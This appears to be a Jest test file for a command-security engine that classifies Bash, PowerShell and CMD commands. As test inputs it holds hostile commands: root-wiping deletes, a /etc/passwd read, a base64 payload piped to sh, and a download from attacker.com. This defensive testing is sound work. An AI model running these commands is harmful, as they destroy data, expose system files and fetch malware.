import { SecurityIREngine } from '../../src/security/ir/ir-engine';

describe('Roadmap Step 2 — Normalized Intermediate Representation (IR) & Modular Analyzers', () => {
  describe('Bash IR Compilation & Semantics', () => {
    it('translates destructive rm -rf / into DELETE_FILE action with rootOrSystem: true', () => {
      const res = SecurityIREngine.evaluate('rm -rf /');
      expect(res.isSafe).toBe(false);
      expect(res.ir.interpreter).toBe('BASH');
      expect(res.ir.actions.some(a => a.type === 'DELETE_FILE')).toBe(true);
      expect(res.findings.some(f => f.ruleId === 'FS-DESTRUCTIVE-ROOT-DELETE')).toBe(true);
    });

    it('translates sensitive file reads into READ_FILE action', () => {
      const res = SecurityIREngine.evaluate('cat /etc/passwd');
      expect(res.isSafe).toBe(false);
      expect(res.ir.actions.some(a => a.type === 'READ_FILE' && a.sensitive)).toBe(true);
    });

    it('translates base64 pipe into ENCODE_DECODE action', () => {
      const res = SecurityIREngine.evaluate('echo dGVzdA== | base64 -d | sh');
      expect(res.ir.actions.some(a => a.type === 'ENCODE_DECODE')).toBe(true);
    });
  });

  describe('PowerShell IR Compilation & Semantics', () => {
    it('translates Remove-Item -Recurse C:\\ into DELETE_FILE action with rootOrSystem: true', () => {
      const res = SecurityIREngine.evaluate('Remove-Item -Recurse -Force C:\\');
      expect(res.isSafe).toBe(false);
      expect(res.ir.interpreter).toBe('POWERSHELL');
      expect(res.ir.actions.some(a => a.type === 'DELETE_FILE' && a.rootOrSystem)).toBe(true);
    });

    it('translates Invoke-Expression into elevated EXECUTE_PROCESS action', () => {
      const res = SecurityIREngine.evaluate('Invoke-Expression "Write-Host test"');
      expect(res.isSafe).toBe(false);
      expect(res.ir.actions.some(a => a.type === 'EXECUTE_PROCESS' && a.elevated)).toBe(true);
    });

    it('translates Invoke-WebRequest into NETWORK_REQUEST action', () => {
      const res = SecurityIREngine.evaluate('Invoke-WebRequest -Uri https://attacker.com/malware.exe');
      expect(res.isSafe).toBe(false);
      expect(res.ir.actions.some(a => a.type === 'NETWORK_REQUEST')).toBe(true);
    });
  });

  describe('CMD IR Compilation & Semantics', () => {
    it('translates del /f /s C:\\* into DELETE_FILE action', () => {
      const res = SecurityIREngine.evaluate('del /f /s C:\\*');
      expect(res.isSafe).toBe(false);
      expect(res.ir.interpreter).toBe('CMD');
      expect(res.ir.actions.some(a => a.type === 'DELETE_FILE')).toBe(true);
    });

    it('allows benign commands through IR pipeline', () => {
      const res = SecurityIREngine.evaluate('git status');
      expect(res.isSafe).toBe(true);
      expect(res.findings.length).toBe(0);
    });
  });
});
